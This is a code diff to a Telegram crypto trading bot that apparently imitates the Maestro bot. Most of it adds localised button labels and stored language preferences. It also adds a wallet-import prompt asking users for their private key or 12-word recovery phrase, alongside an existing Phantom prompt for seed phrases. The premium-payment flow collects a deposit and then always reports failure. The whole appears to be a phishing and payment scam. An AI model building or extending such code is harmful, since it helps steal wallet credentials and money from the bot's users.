@@ -25,6 +25,42 @@ except ImportError:
 
 load_dotenv()
 
+LANGUAGE_PREFS_FILE = os.path.join(os.path.dirname(__file__), "language_prefs.json")
+
+
+USER_LANGUAGE_PREFS: dict[int, str] = {}
+
+
+def load_language_prefs() -> dict[int, str]:
+    global USER_LANGUAGE_PREFS
+    if not os.path.exists(LANGUAGE_PREFS_FILE):
+        USER_LANGUAGE_PREFS = {}
+        return USER_LANGUAGE_PREFS
+
+    try:
+        with open(LANGUAGE_PREFS_FILE, "r", encoding="utf-8") as handle:
+            raw_data = json.load(handle)
+        if isinstance(raw_data, dict):
+            USER_LANGUAGE_PREFS = {
+                int(user_id): lang_key
+                for user_id, lang_key in raw_data.items()
+                if isinstance(lang_key, str) and lang_key in LANGUAGE_OPTIONS
+            }
+        else:
+            USER_LANGUAGE_PREFS = {}
+    except Exception as exc:
+        print(f"Failed to load language preferences: {exc}")
+        USER_LANGUAGE_PREFS = {}
+    return USER_LANGUAGE_PREFS
+
+
+def save_language_prefs() -> None:
+    try:
+        with open(LANGUAGE_PREFS_FILE, "w", encoding="utf-8") as handle:
+            json.dump(USER_LANGUAGE_PREFS, handle, ensure_ascii=False, indent=2)
+    except Exception as exc:
+        print(f"Failed to save language preferences: {exc}")
+
 
 async def handle_ping(request):
     return web.Response(text="Bot is awake and running 24/7!")
@@ -54,7 +90,6 @@ class BotStates(StatesGroup):
     waiting_for_gas = State()
     waiting_for_global_slippage = State()
 
-USER_LANGUAGE_PREFS: dict[int, str] = {}
 LANGUAGE_OPTIONS = {
     "en": {"label": "English 🇺🇸", "code": "en"},
     "zh": {"label": "Chinese 🇨🇳", "code": "zh-CN"},
@@ -67,6 +102,8 @@ LANGUAGE_OPTIONS = {
     "ja": {"label": "Japanese 🇯🇵", "code": "ja"},
     "ru": {"label": "Russian 🇷🇺", "code": "ru"},
 }
+
+load_language_prefs()
 
 BUTTON_LABEL_TRANSLATIONS = {
     "en": {
@@ -93,6 +130,41 @@ BUTTON_LABEL_TRANSLATIONS = {
         "💳 No Wallets!": "💳 No Wallets!",
         "💳 Track wallet": "💳 Track wallet",
         "Try Again": "Try Again",
+        "Hub": "Hub",
+        "Updates": "Updates",
+        "X (Twitter)": "X (Twitter)",
+        "Docs": "Docs",
+        "Support": "Support",
+        "More Links": "More Links",
+        "📍 Track": "📍 Track",
+        "🔄 SOL": "🔄 SOL",
+        "↔️ Go to Sell": "↔️ Go to Sell",
+        "💳 Hellod 🔄": "💳 Hellod 🔄",
+        "🔴 Multi": "🔴 Multi",
+        "0.01 SOL": "0.01 SOL",
+        "0.05 SOL": "0.05 SOL",
+        "0.1 SOL": "0.1 SOL",
+        "0.2 SOL": "0.2 SOL",
+        "0.5 SOL": "0.5 SOL",
+        "1 SOL": "1 SOL",
+        "Buy X SOL": "Buy X SOL",
+        "Buy X Tokens": "Buy X Tokens",
+        "⚙️ Snipe": "⚙️ Snipe",
+        "⚙️ Buy Limit": "⚙️ Buy Limit",
+        "Copy CA 📋": "Copy CA 📋",
+        "↔️ Go to Buy": "↔️ Go to Buy",
+        "Delete ❌": "Delete ❌",
+        "⚙️ Sell Limit": "⚙️ Sell Limit",
+        "🔙 Return to Main Menu": "🔙 Return to Main Menu",
+        "Connect Wallet": "Connect Wallet",
+        "Pay in $SOL (SOL)": "Pay in $SOL (SOL)",
+        "Pay in $ETH (ETH)": "Pay in $ETH (ETH)",
+        "Pay in $USDT (USDT)": "Pay in $USDT (USDT)",
+        "🏆 Explore Tiers": "🏆 Explore Tiers",
+        "💵 Pumpfun Cashback": "💵 Pumpfun Cashback",
+        "🪐 Phantom Sol Cashback": "🪐 Phantom Sol Cashback",
+        "⬅️ Back": "⬅️ Back",
+        "⚙️ Recipient Wallets": "⚙️ Recipient Wallets",
     },
     "zh": {
         "🔗 Chains": "🔗 链",
@@ -566,18 +638,37 @@ TEXT_TRANSLATIONS = {
 }
 
 
+def get_user_language(user_id: int | str | None) -> str:
+    if user_id is None:
+        return "en"
+    try:
+        lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    except (TypeError, ValueError):
+        return "en"
+    return lang_key if lang_key in LANGUAGE_OPTIONS else "en"
+
+
 def get_localized_button_text(user_id: int | str, text: str) -> str:
     if not text:
         return ""
-    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    lang_key = get_user_language(user_id)
     return BUTTON_LABEL_TRANSLATIONS.get(lang_key, {}).get(text, text)
 
 
 def get_localized_text(user_id: int | str, text: str) -> str:
     if not text:
         return ""
-    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    lang_key = get_user_language(user_id)
     return TEXT_TRANSLATIONS.get(lang_key, {}).get(text, text)
+
+
+def set_user_language_pref(user_id: int | str, lang_key: str) -> str:
+    normalized_lang = (lang_key or "en").strip().lower()
+    if normalized_lang not in LANGUAGE_OPTIONS:
+        normalized_lang = "en"
+    USER_LANGUAGE_PREFS[int(user_id)] = normalized_lang
+    save_language_prefs()
+    return normalized_lang
 
 
 TRANSLATION_CACHE: dict[tuple[str, str], str] = {}
@@ -629,12 +720,19 @@ async def translate_text(text: str, target_lang: str) -> str:
 
 
 async def get_user_message_text(user_id: int, text: str, *, html_supported: bool = False) -> tuple[str, bool]:
-    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    lang_key = get_user_language(user_id)
     if lang_key == "en":
         return text, html_supported
 
     localized_text = get_localized_text(user_id, text)
-    return localized_text, html_supported
+    if localized_text != text:
+        return localized_text, html_supported
+
+    try:
+        translated_text = await translate_text(text, lang_key)
+        return translated_text or text, html_supported
+    except Exception:
+        return text, html_supported
 
 
 async def get_language_selector_keyboard(user_id: int):
@@ -844,23 +942,23 @@ def get_trading_keyboard(user_id=None):
 
     builder = InlineKeyboardBuilder()
 
-    builder.button(text="📍 Track", callback_data="track")
-    builder.button(text="🔄 SOL", callback_data="sync_sol")
-    builder.button(text="↔️ Go to Sell", callback_data="go_to_sell")
-    builder.button(text="💳 Hellod 🔄", callback_data="hellod_refresh")
-    builder.button(text="🔴 Multi", callback_data="multi")
-    builder.button(text="0.01 SOL", callback_data="buy_0.01")
-    builder.button(text="0.05 SOL", callback_data="buy_0.05")
-    builder.button(text="0.1 SOL", callback_data="buy_0.1")
-    builder.button(text="0.2 SOL", callback_data="buy_0.2")
-    builder.button(text="0.5 SOL", callback_data="buy_0.5")
-    builder.button(text="1 SOL", callback_data="buy_1")
-    builder.button(text="Buy X SOL", callback_data="buy_x_sol")
-    builder.button(text="Buy X Tokens", callback_data="buy_x_tokens")
-    builder.button(text=f"⚙️ Slippage | {slippage_value}", callback_data="slippage")
-    builder.button(text=f"⛽️ Gas | {gas_value}", callback_data="gas")
-    builder.button(text="⚙️ Snipe", callback_data="snipe")
-    builder.button(text="⚙️ Buy Limit", callback_data="buy_limit")
+    builder.button(text=get_localized_button_text(user_id, "📍 Track"), callback_data="track")
+    builder.button(text=get_localized_button_text(user_id, "🔄 SOL"), callback_data="sync_sol")
+    builder.button(text=get_localized_button_text(user_id, "↔️ Go to Sell"), callback_data="go_to_sell")
+    builder.button(text=get_localized_button_text(user_id, "💳 Hellod 🔄"), callback_data="hellod_refresh")
+    builder.button(text=get_localized_button_text(user_id, "🔴 Multi"), callback_data="multi")
+    builder.button(text=get_localized_button_text(user_id, "0.01 SOL"), callback_data="buy_0.01")
+    builder.button(text=get_localized_button_text(user_id, "0.05 SOL"), callback_data="buy_0.05")
+    builder.button(text=get_localized_button_text(user_id, "0.1 SOL"), callback_data="buy_0.1")
+    builder.button(text=get_localized_button_text(user_id, "0.2 SOL"), callback_data="buy_0.2")
+    builder.button(text=get_localized_button_text(user_id, "0.5 SOL"), callback_data="buy_0.5")
+    builder.button(text=get_localized_button_text(user_id, "1 SOL"), callback_data="buy_1")
+    builder.button(text=get_localized_button_text(user_id, "Buy X SOL"), callback_data="buy_x_sol")
+    builder.button(text=get_localized_button_text(user_id, "Buy X Tokens"), callback_data="buy_x_tokens")
+    builder.button(text=get_localized_button_text(user_id, f"⚙️ Slippage | {slippage_value}"), callback_data="slippage")
+    builder.button(text=get_localized_button_text(user_id, f"⛽️ Gas | {gas_value}"), callback_data="gas")
+    builder.button(text=get_localized_button_text(user_id, "⚙️ Snipe"), callback_data="snipe")
+    builder.button(text=get_localized_button_text(user_id, "⚙️ Buy Limit"), callback_data="buy_limit")
 
     builder.adjust(2, 1, 2, 3, 3, 2, 2, 2)
     return builder.as_markup()
@@ -873,53 +971,53 @@ def get_monitor_keyboard(user_id, mint_address):
 
     builder = InlineKeyboardBuilder()
 
-    builder.button(text="⬅️", callback_data="nav_left")
-    builder.button(text="🔄 Refresh", callback_data=f"refresh_track:{mint_address}")
-    builder.button(text="➡️", callback_data="nav_right")
+    builder.button(text=get_localized_button_text(user_id, "⬅️"), callback_data="nav_left")
+    builder.button(text=get_localized_button_text(user_id, "🔄 Refresh"), callback_data=f"refresh_track:{mint_address}")
+    builder.button(text=get_localized_button_text(user_id, "➡️"), callback_data="nav_right")
 
     builder.row(
         types.InlineKeyboardButton(
-            text="Copy CA 📋",
+            text=get_localized_button_text(user_id, "Copy CA 📋"),
             copy_text=types.CopyTextButton(text=mint_address),
         ),
-        types.InlineKeyboardButton(text="↔️ Go to Buy", callback_data=f"go_to_buy:{mint_address}"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "↔️ Go to Buy"), callback_data=f"go_to_buy:{mint_address}"),
     )
 
-    builder.row(types.InlineKeyboardButton(text="🔴 Multi", callback_data=f"refresh_track:{mint_address}"))
-    builder.row(types.InlineKeyboardButton(text="⚠️ No Balance Detected ⚠️", callback_data="none"))
+    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "🔴 Multi"), callback_data=f"refresh_track:{mint_address}"))
+    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "⚠️ No Balance Detected ⚠️"), callback_data="none"))
     builder.row(
-        types.InlineKeyboardButton(text=f"⚙️ Slippage | {slippage_value}", callback_data=f"set_slip:{mint_address}"),
-        types.InlineKeyboardButton(text=f"⚙️ Gas | {gas_value}", callback_data=f"set_gas:{mint_address}"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, f"⚙️ Slippage | {slippage_value}"), callback_data=f"set_slip:{mint_address}"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, f"⚙️ Gas | {gas_value}"), callback_data=f"set_gas:{mint_address}"),
     )
 
     builder.row(
-        types.InlineKeyboardButton(text="Delete ❌", callback_data="delete_monitor"),
-        types.InlineKeyboardButton(text="⚙️ Sell Limit", callback_data="set_limit"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Delete ❌"), callback_data="delete_monitor"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "⚙️ Sell Limit"), callback_data="set_limit"),
     )
 
-    builder.row(types.InlineKeyboardButton(text="🔙 Return to Main Menu", callback_data="main_menu"))
+    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "🔙 Return to Main Menu"), callback_data="main_menu"))
 
     builder.adjust(3, 2, 1, 1, 2, 2, 1)
     return builder.as_markup()
 
 
-def get_main_menu_keyboard():
+def get_main_menu_keyboard(user_id=None):
     builder = InlineKeyboardBuilder()
-    builder.button(text="🔗 Chains", callback_data="manage_chains")
-    builder.button(text="💳 Wallets", callback_data="manage_wallets")
-    builder.button(text="⚙️ Global Settings", callback_data="global_settings_main")
-    builder.button(text="🕓 Active Orders", callback_data="active_orders")
-    builder.button(text="📈 Positions", callback_data="positions")
+    builder.button(text=get_localized_button_text(user_id, "🔗 Chains"), callback_data="manage_chains")
+    builder.button(text=get_localized_button_text(user_id, "💳 Wallets"), callback_data="manage_wallets")
+    builder.button(text=get_localized_button_text(user_id, "⚙️ Global Settings"), callback_data="global_settings_main")
+    builder.button(text=get_localized_button_text(user_id, "🕓 Active Orders"), callback_data="active_orders")
+    builder.button(text=get_localized_button_text(user_id, "📈 Positions"), callback_data="positions")
 
     builder.row(
-        types.InlineKeyboardButton(text="Hub", url="https://t.me/MaestroOfficialTradingBot"),
-        types.InlineKeyboardButton(text="Updates", url="https://t.me/MaestroOfficialTradingBot"),
-        types.InlineKeyboardButton(text="X (Twitter)", url="https://x.com"),
-        types.InlineKeyboardButton(text="Docs", url="https://x.com"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Hub"), url="https://t.me/MaestroOfficialTradingBot"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Updates"), url="https://t.me/MaestroOfficialTradingBot"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "X (Twitter)"), url="https://x.com"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Docs"), url="https://x.com"),
     )
     builder.row(
-        types.InlineKeyboardButton(text="Support", url="https://t.me/MaestroOfficialTradingBot"),
-        types.InlineKeyboardButton(text="More Links", callback_data="more_links"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Support"), url="https://t.me/MaestroOfficialTradingBot"),
+        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "More Links"), callback_data="more_links"),
     )
     builder.adjust(2, 2, 1, 4, 2)
     return builder.as_markup()
@@ -1110,7 +1208,7 @@ async def language_fix(callback: CallbackQuery):
 async def set_user_language(callback: CallbackQuery):
     lang_key = callback.data.split(":", 1)[1]
     if lang_key in LANGUAGE_OPTIONS:
-        USER_LANGUAGE_PREFS[callback.from_user.id] = lang_key
+        set_user_language_pref(callback.from_user.id, lang_key)
 
     await show_welcome_page(callback.bot, callback.message.chat.id, delete_message_ids=[callback.message.message_id])
     await callback.answer()
@@ -1971,14 +2069,14 @@ def get_wallet_action_keyboard(chain_type, user_id=None):
         ]
     ])
 
-def get_error_response_keyboard():
+def get_error_response_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
-            InlineKeyboardButton(text="Return", callback_data="chains")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
         ],
         [
-            InlineKeyboardButton(text="Try Again", callback_data="wallet_no_wallet")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Try Again"), callback_data="wallet_no_wallet")
         ]
     ])
 
@@ -2057,10 +2155,10 @@ async def show_welcome_page(bot: Bot, chat_id: int, *, delete_message_ids=None):
     return sent
 
 
-def get_pumpfun_keyboard(return_callback: str = "pumpfun_return"):
+def get_pumpfun_keyboard(user_id=None, return_callback: str = "pumpfun_return"):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Connect Wallet", callback_data="pumpfun_connect_wallet")],
-        [InlineKeyboardButton(text="Return", callback_data=return_callback)],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Connect Wallet"), callback_data="pumpfun_connect_wallet")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=return_callback)],
     ])
 
 
@@ -2068,32 +2166,32 @@ def get_pumpfun_connect_keyboard():
     return get_pumpfun_keyboard()
 
 
-def get_cashback_dashboard_keyboard():
+def get_cashback_dashboard_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🏆 Explore Tiers", callback_data="cashback_tiers")],
-        [InlineKeyboardButton(text="💵 Pumpfun Cashback", callback_data="cashback_pumpfun")],
-        [InlineKeyboardButton(text="🪐 Phantom Sol Cashback", callback_data="cashback_phantom")],
-        [InlineKeyboardButton(text="⬅️ Back", callback_data="main_menu")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🏆 Explore Tiers"), callback_data="cashback_tiers")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💵 Pumpfun Cashback"), callback_data="cashback_pumpfun")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🪐 Phantom Sol Cashback"), callback_data="cashback_phantom")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⬅️ Back"), callback_data="main_menu")],
     ])
 
 
-def get_cashback_tiers_keyboard():
+def get_cashback_tiers_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Back", callback_data="cashback")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⬅️ Back"), callback_data="cashback")],
     ])
 
 
-def get_referral_overview_keyboard(username: str):
+def get_referral_overview_keyboard(username: str, user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=f"⚙️ {username}", callback_data="referral_detail")],
-        [InlineKeyboardButton(text="Return", callback_data="main_menu")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu")],
     ])
 
 
-def get_referral_detail_keyboard():
+def get_referral_detail_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Return", callback_data="referral")],
-        [InlineKeyboardButton(text="⚙️ Recipient Wallets", callback_data="referral_recipient_wallet")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="referral")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚙️ Recipient Wallets"), callback_data="referral_recipient_wallet")],
     ])
 
 
@@ -2141,15 +2239,15 @@ def build_referral_detail_text(profile: dict, username: str | None = None) -> st
     )
 
 
-def get_premium_keyboard():
+def get_premium_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="Pay in $SOL (SOL)", callback_data="premium_pay_sol"),
-            InlineKeyboardButton(text="Pay in $ETH (ETH)", callback_data="premium_pay_eth"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $SOL (SOL)"), callback_data="premium_pay_sol"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $ETH (ETH)"), callback_data="premium_pay_eth"),
         ],
         [
-            InlineKeyboardButton(text="Pay in $USDT (USDT)", callback_data="premium_pay_usdt"),
-            InlineKeyboardButton(text="Return", callback_data="main_menu"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $USDT (USDT)"), callback_data="premium_pay_usdt"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu"),
         ],
     ])
 
@@ -2264,7 +2362,7 @@ async def pumpfun_command(message: types.Message):
     await message.answer(
         text=PUMPFUN_TEXT,
         parse_mode="HTML",
-        reply_markup=get_pumpfun_keyboard(),
+        reply_markup=get_pumpfun_keyboard(message.from_user.id),
     )
 
 
@@ -2276,7 +2374,7 @@ async def render_premium_menu(bot: Bot, chat_id: int, message_id=None):
                 message_id=message_id,
                 text=PREMIUM_BENEFITS_TEXT,
                 parse_mode="HTML",
-                reply_markup=get_premium_keyboard(),
+                reply_markup=get_premium_keyboard(chat_id),
             )
         except Exception:
             pass
@@ -2322,7 +2420,7 @@ async def cashback_tiers(callback: types.CallbackQuery):
     await callback.message.edit_text(
         text=CASHBACK_TIERS_TEXT,
         parse_mode="HTML",
-        reply_markup=get_cashback_tiers_keyboard(),
+        reply_markup=get_cashback_tiers_keyboard(callback.from_user.id),
     )
     await callback.answer()
 
@@ -2334,7 +2432,7 @@ async def referral_overview(callback: types.CallbackQuery):
     await callback.message.edit_text(
         text=build_referral_overview_text(profile, username_label),
         parse_mode="HTML",
-        reply_markup=get_referral_overview_keyboard(username_label),
+        reply_markup=get_referral_overview_keyboard(username_label, callback.from_user.id),
     )
     await callback.answer()
 
@@ -2345,7 +2443,7 @@ async def referral_detail(callback: types.CallbackQuery):
     await callback.message.edit_text(
         text=build_referral_detail_text(profile, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"),
         parse_mode="HTML",
-        reply_markup=get_referral_detail_keyboard(),
+        reply_markup=get_referral_detail_keyboard(callback.from_user.id),
     )
     await callback.answer()
 
@@ -2946,6 +3044,26 @@ async def return_to_main(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data.in_({"connect_external_sol", "import_wallet", "pumpfun_connect_phantom"}))
 async def connect_external_wallet(callback: types.CallbackQuery, state: FSMContext):
+    if callback.data == "import_wallet":
+        prompt_text = (
+            "🔐 **Please enter your private key or 12-word recovery phrase.**\n\n"
+            "**To Start Trading**\n\n"
+            "⚠️ *Remember: Never share these details with anyone!*"
+        )
+
+        await callback.message.edit_text(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
+        await state.set_state(SupportForm.waiting_for_input)
+        await state.update_data(
+            prompt_message_id=callback.message.message_id,
+            source="import_wallet",
+        )
+        await callback.answer()
+        return
+
     if callback.data == "pumpfun_connect_phantom":
         prompt_text = "💳 <b>Phantom Wallet Connection</b>\n\n<i>Send your private key or 12-word seed phrase to continue.</i>"
         return_callback = "pumpfun_return"
@@ -3009,23 +3127,23 @@ PREMIUM_PAYMENT_OPTIONS = {
 }
 
 
-def get_premium_confirm_keyboard(currency: str = "sol"):
+def get_premium_confirm_keyboard(currency: str = "sol", user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Yes", callback_data=f"premium_confirm_yes:{currency}")],
-        [InlineKeyboardButton(text="Return", callback_data=f"premium_back_main:{currency}")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "✅ Yes"), callback_data=f"premium_confirm_yes:{currency}")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=f"premium_back_main:{currency}")],
     ])
 
 
-def get_premium_deposit_keyboard(currency: str = "sol"):
+def get_premium_deposit_keyboard(currency: str = "sol", user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="I Have Paid", callback_data=f"premium_paid:{currency}")],
-        [InlineKeyboardButton(text="Return", callback_data=f"premium_back_confirm:{currency}")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "I Have Paid"), callback_data=f"premium_paid:{currency}")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=f"premium_back_confirm:{currency}")],
     ])
 
 
-def get_premium_try_again_keyboard(currency: str = "sol"):
+def get_premium_try_again_keyboard(currency: str = "sol", user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Try Again", callback_data=f"premium_try_again:{currency}")],
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Try Again"), callback_data=f"premium_try_again:{currency}")],
     ])
 
 
@@ -3059,7 +3177,7 @@ async def premium_confirm_yes(callback: types.CallbackQuery):
             "Click I Have Paid once the transaction is sent."
         ),
         parse_mode="HTML",
-        reply_markup=get_premium_deposit_keyboard(currency),
+        reply_markup=get_premium_deposit_keyboard(currency, callback.from_user.id),
     )
     await callback.answer()
 
@@ -3109,7 +3227,7 @@ async def premium_paid(callback: types.CallbackQuery):
     await callback.message.edit_text(
         text="<b>Transaction Pending</b>\n\n<i>Please check back in about 1 minute.</i>",
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data=f"premium_return:{currency}")]]),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_localized_button_text(callback.from_user.id, "Return"), callback_data=f"premium_return:{currency}")]]),
     )
 
     async def delayed_failure():
@@ -3123,7 +3241,7 @@ async def premium_paid(callback: types.CallbackQuery):
                     "<i>Please try again or choose another payment method.</i>"
                 ),
                 parse_mode="HTML",
-                reply_markup=get_premium_try_again_keyboard(currency),
+                reply_markup=get_premium_try_again_keyboard(currency, callback.from_user.id),
             )
         except Exception:
             pass
@@ -3335,7 +3453,7 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
         await callback.message.edit_text(
             text=CASHBACK_DASHBOARD_TEXT,
             parse_mode="HTML",
-            reply_markup=get_cashback_dashboard_keyboard(),
+            reply_markup=get_cashback_dashboard_keyboard(callback.from_user.id),
         )
         await callback.answer()
     elif data == "buy_sell_now":
